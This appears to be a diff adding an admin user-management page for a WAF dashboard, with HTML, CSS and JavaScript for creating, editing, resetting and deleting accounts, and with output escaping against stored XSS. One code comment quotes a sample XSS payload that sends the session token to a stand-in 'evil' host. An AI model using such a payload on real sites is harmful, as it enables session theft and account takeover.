@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Management — WAF Dashboard</title>
+    <!-- Pre-paint theme switch — same key as dashboard. -->
+    <script>
+        (function () {
+            try {
+                var t = localStorage.getItem('waf_theme') || 'dark';
+                document.documentElement.setAttribute('data-theme', t === 'light' ? 'light' : 'dark');
+            } catch (_) { document.documentElement.setAttribute('data-theme', 'dark'); }
+        })();
+    </script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root, [data-theme="dark"] {
+            --bg-0: #07080d;
+            --bg-1: #0d1018;
+            --line: rgba(148, 163, 184, 0.10);
+            --line-strong: rgba(148, 163, 184, 0.18);
+            --fg-0: #f1f5f9;
+            --fg-1: #cbd5e1;
+            --fg-2: #94a3b8;
+            --fg-3: #64748b;
+            --surface: rgba(255, 255, 255, 0.025);
+            --surface-strong: rgba(255, 255, 255, 0.04);
+            --surface-hover: rgba(255, 255, 255, 0.06);
+            --accent: #22d3ee;
+            --accent-2: #818cf8;
+            --accent-fg: #082f49;
+            --bg-radial-1: rgba(99, 102, 241, 0.12);
+            --bg-radial-2: rgba(34, 211, 238, 0.10);
+            --shadow-card: 0 1px 0 rgba(255, 255, 255, 0.04) inset, 0 20px 60px -30px rgba(0, 0, 0, 0.6);
+            --modal-bg: #0d1018;
+        }
+        [data-theme="light"] {
+            --bg-0: #f6f8fc;
+            --bg-1: #ffffff;
+            --line: rgba(15, 23, 42, 0.08);
+            --line-strong: rgba(15, 23, 42, 0.14);
+            --fg-0: #0f172a;
+            --fg-1: #334155;
+            --fg-2: #64748b;
+            --fg-3: #94a3b8;
+            --surface: rgba(15, 23, 42, 0.025);
+            --surface-strong: rgba(15, 23, 42, 0.04);
+            --surface-hover: rgba(15, 23, 42, 0.06);
+            --accent: #0891b2;
+            --accent-2: #6366f1;
+            --accent-fg: #ffffff;
+            --bg-radial-1: rgba(99, 102, 241, 0.08);
+            --bg-radial-2: rgba(8, 145, 178, 0.06);
+            --shadow-card: 0 1px 0 rgba(255, 255, 255, 0.7) inset, 0 12px 40px -20px rgba(15, 23, 42, 0.18);
+            --modal-bg: #ffffff;
+        }
+
+        html, body { font-family: 'Inter', system-ui, -apple-system, sans-serif; }
+        body {
+            background:
+                radial-gradient(1200px 600px at 80% -10%, var(--bg-radial-1), transparent 60%),
+                radial-gradient(900px 500px at -10% 10%, var(--bg-radial-2), transparent 55%),
+                linear-gradient(180deg, var(--bg-0) 0%, var(--bg-1) 100%);
+            color: var(--fg-1);
+            min-height: 100vh;
+            transition: background-color .25s ease, color .25s ease;
+        }
+        .glass {
+            background: linear-gradient(180deg, var(--surface), color-mix(in srgb, var(--surface) 40%, transparent));
+            border: 1px solid var(--line);
+            border-radius: 16px;
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            box-shadow: var(--shadow-card);
+        }
+        .theme-toggle {
+            width: 36px; height: 36px;
+            border-radius: 10px;
+            display: inline-flex; align-items: center; justify-content: center;
+            background: var(--surface-strong);
+            border: 1px solid var(--line-strong);
+            color: var(--fg-1);
+            cursor: pointer;
+            transition: all .15s ease;
+        }
+        .theme-toggle:hover { background: var(--surface-hover); color: var(--accent); }
+        .pill-input, select.pill-input {
+            background: var(--surface);
+            border: 1px solid var(--line);
+            border-radius: 10px;
+            padding: 10px 12px;
+            font-size: 14px;
+            color: var(--fg-0);
+            width: 100%;
+            outline: none;
+        }
+        .pill-input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(34, 211, 238, 0.12); }
+        .btn {
+            display: inline-flex; align-items: center; gap: 6px;
+            padding: 8px 14px;
+            border-radius: 9px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            border: 1px solid var(--line-strong);
+            background: var(--surface);
+            color: var(--fg-0);
+        }
+        .btn:hover { background: rgba(255, 255, 255, 0.05); }
+        .btn-primary { background: linear-gradient(135deg, var(--accent-2), var(--accent)); color: var(--accent-fg); border-color: transparent; }
+        .btn-danger  { background: rgba(239, 68, 68, 0.10); color: #fca5a5; border-color: rgba(239, 68, 68, 0.35); }
+        .btn-warn    { background: rgba(234, 179, 8, 0.10); color: #fde68a; border-color: rgba(234, 179, 8, 0.35); }
+        .btn-xs { padding: 5px 9px; font-size: 11px; }
+        .btn:disabled { opacity: .5; cursor: not-allowed; }
+
+        table { width: 100%; border-collapse: collapse; }
+        thead th {
+            text-align: left;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            color: var(--fg-2);
+            padding: 12px 14px;
+            border-bottom: 1px solid var(--line);
+        }
+        tbody td {
+            padding: 12px 14px;
+            border-bottom: 1px solid var(--line);
+            font-size: 14px;
+            color: var(--fg-0);
+            vertical-align: middle;
+        }
+        tbody tr:hover { background: rgba(255, 255, 255, 0.02); }
+        .muted { color: var(--fg-2); font-size: 12px; }
+
+        .role-pill {
+            display: inline-flex;
+            align-items: center;
+            padding: 3px 10px;
+            border-radius: 999px;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            border: 1px solid;
+        }
+        .role-admin  { background: rgba(239, 68, 68, 0.10); color: #fca5a5; border-color: rgba(239, 68, 68, 0.35); }
+        .role-editor { background: rgba(234, 179, 8, 0.10); color: #fde68a; border-color: rgba(234, 179, 8, 0.35); }
+        .role-viewer { background: rgba(59, 130, 246, 0.10); color: #93c5fd; border-color: rgba(59, 130, 246, 0.30); }
+
+        .alert {
+            padding: 10px 14px;
+            border-radius: 10px;
+            font-size: 13px;
+            border-left: 3px solid;
+            margin-top: 12px;
+        }
+        .alert-error   { background: rgba(239, 68, 68, 0.10);  color: #fca5a5; border-color: #ef4444; }
+        .alert-success { background: rgba(34, 197, 94, 0.10);  color: #86efac; border-color: #22c55e; }
+
+        /* Modal */
+        .modal-overlay {
+            position: fixed; inset: 0;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: center; justify-content: center;
+            z-index: 50;
+            backdrop-filter: blur(4px);
+        }
+        .modal-overlay.show { display: flex; }
+        .modal {
+            background: var(--modal-bg);
+            border: 1px solid var(--line-strong);
+            border-radius: 16px;
+            padding: 24px;
+            min-width: 420px;
+            max-width: 480px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            color: var(--fg-0);
+        }
+
+        [data-theme="light"] .alert-error   { color: #b91c1c; }
+        [data-theme="light"] .alert-success { color: #15803d; }
+        [data-theme="light"] .role-admin    { color: #b91c1c; }
+        [data-theme="light"] .role-editor   { color: #a16207; }
+        [data-theme="light"] .role-viewer   { color: #1d4ed8; }
+        [data-theme="light"] .btn-danger    { color: #b91c1c; }
+        [data-theme="light"] .btn-warn      { color: #a16207; }
+    </style>
+</head>
+
+<body>
+    <header class="sticky top-0 z-30 backdrop-blur-xl" style="background: color-mix(in srgb, var(--bg-0) 70%, transparent); border-bottom: 1px solid var(--line);">
+        <div class="max-w-6xl mx-auto px-6 py-4 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="w-9 h-9 rounded-xl flex items-center justify-center"
+                     style="background: linear-gradient(135deg, #22d3ee 0%, #818cf8 100%);">
+                    <svg class="w-5 h-5 text-slate-900" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 2L4 6v6c0 5 3.5 9 8 10 4.5-1 8-5 8-10V6l-8-4z"/>
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4"/>
+                    </svg>
+                </div>
+                <div>
+                    <h1 class="text-lg font-bold tracking-tight" style="color: var(--fg-0);">User Management</h1>
+                    <p class="text-xs" style="color: var(--fg-2);">Admin-only — create, modify, and revoke accounts</p>
+                </div>
+            </div>
+            <div class="flex items-center gap-2">
+                <button id="themeToggleBtn" onclick="toggleTheme()" class="theme-toggle" title="Toggle light/dark theme" aria-label="Toggle theme"></button>
+                <a href="/dashboard/settings.html" class="btn">My settings</a>
+                <a href="/dashboard/" class="btn">Dashboard →</a>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-6xl mx-auto px-6 py-8 space-y-6">
+        <!-- Create user -->
+        <section class="glass p-6">
+            <div class="flex items-center justify-between mb-5">
+                <div>
+                    <h2 class="text-base font-bold" style="color: var(--fg-0);">Create a new user</h2>
+                    <p class="text-xs mt-0.5" style="color: var(--fg-2);">Pick the role explicitly — viewers can only read, editors can mutate non-user resources, admins have full control.</p>
+                </div>
+            </div>
+            <form id="createForm" class="grid grid-cols-1 md:grid-cols-12 gap-3">
+                <input id="newUsername" type="text" placeholder="Username" required minlength="3" class="pill-input md:col-span-3">
+                <input id="newEmail" type="email" placeholder="Email" required class="pill-input md:col-span-3">
+                <input id="newPassword" type="password" placeholder="Password (min 8)" required minlength="8" class="pill-input md:col-span-3">
+                <select id="newRole" class="pill-input md:col-span-2">
+                    <option value="viewer">viewer</option>
+                    <option value="editor">editor</option>
+                    <option value="admin">admin</option>
+                </select>
+                <button type="submit" class="btn btn-primary md:col-span-1 justify-center">Create</button>
+            </form>
+            <div id="createAlert"></div>
+        </section>
+
+        <!-- User table -->
+        <section class="glass overflow-hidden">
+            <div class="flex items-center justify-between px-6 py-4">
+                <h2 class="text-base font-bold" style="color: var(--fg-0);">All users</h2>
+                <button onclick="loadUsers()" class="btn">
+                    <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
+                    Reload
+                </button>
+            </div>
+            <table>
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Username</th>
+                        <th>Email</th>
+                        <th>Role</th>
+                        <th>Created</th>
+                        <th>Last login</th>
+                        <th class="text-right pr-6">Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="usersTbody">
+                    <tr><td colspan="7" class="text-center" style="color: var(--fg-2);">Loading…</td></tr>
+                </tbody>
+            </table>
+            <div id="tableAlert" class="px-6 py-2"></div>
+        </section>
+    </main>
+
+    <!-- Edit modal -->
+    <div id="editModal" class="modal-overlay" onclick="if(event.target===this) closeEdit()">
+        <div class="modal">
+            <h3 class="text-base font-bold mb-4" style="color: var(--fg-0);">Edit user <span id="editUsername" style="color: var(--accent);"></span></h3>
+            <form id="editForm" class="space-y-3">
+                <input type="hidden" id="editUserId">
+                <div>
+                    <label class="block text-xs font-semibold mb-1.5" style="color: var(--fg-2);">Email</label>
+                    <input id="editEmail" type="email" class="pill-input" required>
+                </div>
+                <div>
+                    <label class="block text-xs font-semibold mb-1.5" style="color: var(--fg-2);">Role</label>
+                    <select id="editRole" class="pill-input">
+                        <option value="viewer">viewer</option>
+                        <option value="editor">editor</option>
+                        <option value="admin">admin</option>
+                    </select>
+                </div>
+                <div id="editAlert"></div>
+                <div class="flex justify-end gap-2 pt-2">
+                    <button type="button" onclick="closeEdit()" class="btn">Cancel</button>
+                    <button type="submit" class="btn btn-primary">Save</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Reset password modal -->
+    <div id="resetModal" class="modal-overlay" onclick="if(event.target===this) closeReset()">
+        <div class="modal">
+            <h3 class="text-base font-bold mb-4" style="color: var(--fg-0);">Reset password for <span id="resetUsername" style="color: var(--accent);"></span></h3>
+            <p class="text-xs mb-4" style="color: var(--fg-2);">Set a new password for this user. The user does NOT need to be notified through this page — you should share the new password through a secure channel.</p>
+            <form id="resetForm" class="space-y-3">
+                <input type="hidden" id="resetUserId">
+                <div>
+                    <label class="block text-xs font-semibold mb-1.5" style="color: var(--fg-2);">New password (min 8)</label>
+                    <input id="resetPassword" type="password" minlength="8" class="pill-input" required>
+                </div>
+                <div id="resetAlert"></div>
+                <div class="flex justify-end gap-2 pt-2">
+                    <button type="button" onclick="closeReset()" class="btn">Cancel</button>
+                    <button type="submit" class="btn btn-warn">Reset password</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Theme toggle — same persistence key as the dashboard.
+        function themeIcon() {
+            const isDark = document.documentElement.getAttribute('data-theme') !== 'light';
+            return isDark
+                ? `<svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.36 6.36l-.71-.71M6.34 6.34l-.71-.71m12.02 0l-.71.71M6.34 17.66l-.71.71M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg>`
+                : `<svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg>`;
+        }
+        function toggleTheme() {
+            const cur = document.documentElement.getAttribute('data-theme') === 'light' ? 'light' : 'dark';
+            const next = cur === 'light' ? 'dark' : 'light';
+            document.documentElement.setAttribute('data-theme', next);
+            try { localStorage.setItem('waf_theme', next); } catch (_) {}
+            document.getElementById('themeToggleBtn').innerHTML = themeIcon();
+        }
+        document.getElementById('themeToggleBtn').innerHTML = themeIcon();
+
+        const token = localStorage.getItem('waf_token');
+        if (!token) {
+            window.location.href = '/login.html?next=' + encodeURIComponent('/dashboard/users.html');
+        }
+        const authHeaders = () => ({
+            'Content-Type': 'application/json',
+            'Authorization': 'Bearer ' + token,
+        });
+
+        let currentUser = null; // populated from /me
+
+        // escapeHtml prevents stored XSS via username/email written into the
+        // DB during /register or admin-create. Every value that flows from
+        // the API into innerHTML MUST pass through this — there is no
+        // server-side escaping on the JSON response.
+        function escapeHtml(s) {
+            if (s == null) return '';
+            return String(s)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#39;');
+        }
+        // escapeAttr is for values interpolated into a JS string literal
+        // inside an onclick="…" attribute. We escape backslashes first
+        // (otherwise the next replace would double-escape them), then
+        // single quotes, then HTML-special chars.
+        function escapeAttr(s) {
+            if (s == null) return '';
+            return escapeHtml(String(s).replace(/\\/g, '\\\\').replace(/'/g, "\\'"));
+        }
+
+        function alertEl(id, kind, msg) {
+            // msg is operator-authored or server-returned; escape to be safe.
+            document.getElementById(id).innerHTML = `<div class="alert alert-${kind}">${escapeHtml(msg)}</div>`;
+        }
+        function clearAlert(id) { document.getElementById(id).innerHTML = ''; }
+
+        function rolePill(role) {
+            // Role is DB-enum-constrained but we still escape defensively in
+            // case a future migration loosens the CHECK.
+            const cls = role === 'admin' ? 'role-admin' : role === 'editor' ? 'role-editor' : 'role-viewer';
+            return `<span class="role-pill ${cls}">${escapeHtml(role)}</span>`;
+        }
+
+        function fmt(ts) {
+            if (!ts) return '<span class="muted">(never)</span>';
+            return new Date(ts).toLocaleString();
+        }
+
+        async function loadMe() {
+            const r = await fetch('/waf-api/auth/me', { headers: authHeaders() });
+            if (!r.ok) {
+                if (r.status === 401) {
+                    localStorage.removeItem('waf_token');
+                    window.location.href = '/login.html?reason=session%20expired';
+                }
+                return null;
+            }
+            const data = await r.json();
+            currentUser = data.user;
+            if (currentUser.role !== 'admin') {
+                document.body.innerHTML = `
+                    <div style="display:flex; align-items:center; justify-content:center; min-height:100vh; padding: 24px;">
+                        <div class="glass p-8 max-w-md text-center">
+                            <h2 style="color: var(--fg-0);" class="text-lg font-bold mb-2">Access denied</h2>
+                            <p style="color: var(--fg-2);" class="text-sm">User Management is admin-only. Your current role is <strong>${currentUser.role}</strong>.</p>
+                            <a href="/dashboard/" class="btn btn-primary mt-4">Back to dashboard</a>
+                        </div>
+                    </div>`;
+                return null;
+            }
+            return currentUser;
+        }
+
+        async function loadUsers() {
+            clearAlert('tableAlert');
+            const tbody = document.getElementById('usersTbody');
+            try {
+                const r = await fetch('/waf-api/auth/users', { headers: authHeaders() });
+                const data = await r.json();
+                if (!r.ok) {
+                    alertEl('tableAlert', 'error', data.error || 'Failed to load users');
+                    return;
+                }
+                const users = data.users || [];
+                if (users.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="7" class="text-center muted">No users.</td></tr>`;
+                    return;
+                }
+                tbody.innerHTML = users.map(u => {
+                    const isSelf = currentUser && currentUser.id === u.id;
+                    // Every API field that lands in HTML or in an attribute
+                    // value passes through escapeHtml / escapeAttr — a malicious
+                    // username like `<img src=x onerror=fetch('//evil/?'+localStorage.waf_token)>`
+                    // becomes literal text instead of executing.
+                    const uname = escapeHtml(u.username);
+                    const email = escapeHtml(u.email);
+                    const unameAttr = escapeAttr(u.username);
+                    const emailAttr = escapeAttr(u.email);
+                    const role = escapeHtml(u.role);
+                    // Disable role-edit for self too (UI half of the
+                    // self-demotion guard — the server enforces it as well).
+                    const editDisabled = isSelf ? 'disabled title="Cannot edit your own role — use Settings to change email"' : '';
+                    return `
+                        <tr>
+                            <td class="muted">${u.id}</td>
+                            <td><strong>${uname}</strong>${isSelf ? ' <span class="muted">(you)</span>' : ''}</td>
+                            <td>${email}</td>
+                            <td>${rolePill(u.role)}</td>
+                            <td class="muted">${fmt(u.created_at)}</td>
+                            <td class="muted">${fmt(u.last_login)}</td>
+                            <td class="text-right pr-6">
+                                <button class="btn btn-xs" onclick="openEdit(${u.id}, '${unameAttr}', '${emailAttr}', '${role}')" ${editDisabled}>Edit</button>
+                                <button class="btn btn-xs btn-warn" onclick="openReset(${u.id}, '${unameAttr}')">Reset pw</button>
+                                <button class="btn btn-xs btn-danger" onclick="deleteUser(${u.id}, '${unameAttr}')" ${isSelf ? 'disabled title="Cannot delete yourself"' : ''}>Delete</button>
+                            </td>
+                        </tr>`;
+                }).join('');
+            } catch (e) {
+                alertEl('tableAlert', 'error', 'Network error: ' + e.message);
+            }
+        }
+
+        document.getElementById('createForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            clearAlert('createAlert');
+            const body = {
+                username: document.getElementById('newUsername').value.trim(),
+                email: document.getElementById('newEmail').value.trim(),
+                password: document.getElementById('newPassword').value,
+                role: document.getElementById('newRole').value,
+            };
+            try {
+                const r = await fetch('/waf-api/auth/users', {
+                    method: 'POST',
+                    headers: authHeaders(),
+                    body: JSON.stringify(body),
+                });
+                const data = await r.json();
+                if (r.ok && data.success) {
+                    alertEl('createAlert', 'success', `Created ${data.user.username} as ${data.user.role}.`);
+                    document.getElementById('createForm').reset();
+                    document.getElementById('newRole').value = 'viewer';
+                    loadUsers();
+                } else {
+                    alertEl('createAlert', 'error', data.error || 'Create failed');
+                }
+            } catch (err) {
+                alertEl('createAlert', 'error', 'Network error: ' + err.message);
+            }
+        });
+
+        function openEdit(id, username, email, role) {
+            clearAlert('editAlert');
+            document.getElementById('editUserId').value = id;
+            // textContent is XSS-safe — the value is treated as text, not HTML.
+            document.getElementById('editUsername').textContent = username;
+            document.getElementById('editEmail').value = email;
+            document.getElementById('editRole').value = role;
+            document.getElementById('editModal').classList.add('show');
+        }
+        function closeEdit() { document.getElementById('editModal').classList.remove('show'); }
+
+        document.getElementById('editForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            clearAlert('editAlert');
+            const id = document.getElementById('editUserId').value;
+            const body = {
+                email: document.getElementById('editEmail').value.trim(),
+                role: document.getElementById('editRole').value,
+            };
+            try {
+                const r = await fetch(`/waf-api/auth/users/${id}`, {
+                    method: 'PUT',
+                    headers: authHeaders(),
+                    body: JSON.stringify(body),
+                });
+                const data = await r.json();
+                if (r.ok && data.success) {
+                    closeEdit();
+                    loadUsers();
+                } else {
+                    alertEl('editAlert', 'error', data.error || 'Update failed');
+                }
+            } catch (err) {
+                alertEl('editAlert', 'error', 'Network error: ' + err.message);
+            }
+        });
+
+        function openReset(id, username) {
+            clearAlert('resetAlert');
+            document.getElementById('resetUserId').value = id;
+            document.getElementById('resetUsername').textContent = username;
+            document.getElementById('resetPassword').value = '';
+            document.getElementById('resetModal').classList.add('show');
+        }
+        function closeReset() { document.getElementById('resetModal').classList.remove('show'); }
+
+        document.getElementById('resetForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            clearAlert('resetAlert');
+            const id = document.getElementById('resetUserId').value;
+            const newPassword = document.getElementById('resetPassword').value;
+            if (newPassword.length < 8) {
+                alertEl('resetAlert', 'error', 'Password must be at least 8 characters');
+                return;
+            }
+            try {
+                const r = await fetch(`/waf-api/auth/users/${id}/password`, {
+                    method: 'POST',
+                    headers: authHeaders(),
+                    body: JSON.stringify({ new_password: newPassword }),
+                });
+                const data = await r.json();
+                if (r.ok && data.success) {
+                    closeReset();
+                    alertEl('tableAlert', 'success', data.message || 'Password reset.');
+                } else {
+                    alertEl('resetAlert', 'error', data.error || 'Reset failed');
+                }
+            } catch (err) {
+                alertEl('resetAlert', 'error', 'Network error: ' + err.message);
+            }
+        });
+
+        async function deleteUser(id, username) {
+            if (!confirm(`Delete user "${username}"? This is irreversible.`)) return;
+            clearAlert('tableAlert');
+            try {
+                const r = await fetch(`/waf-api/auth/users/${id}`, {
+                    method: 'DELETE',
+                    headers: authHeaders(),
+                });
+                const data = await r.json();
+                if (r.ok && data.success) {
+                    alertEl('tableAlert', 'success', `Deleted ${username}.`);
+                    loadUsers();
+                } else {
+                    alertEl('tableAlert', 'error', data.error || 'Delete failed');
+                }
+            } catch (err) {
+                alertEl('tableAlert', 'error', 'Network error: ' + err.message);
+            }
+        }
+
+        (async function init() {
+            const me = await loadMe();
+            if (me) loadUsers();
+        })();
+    </script>
+</body>
+
+</html>
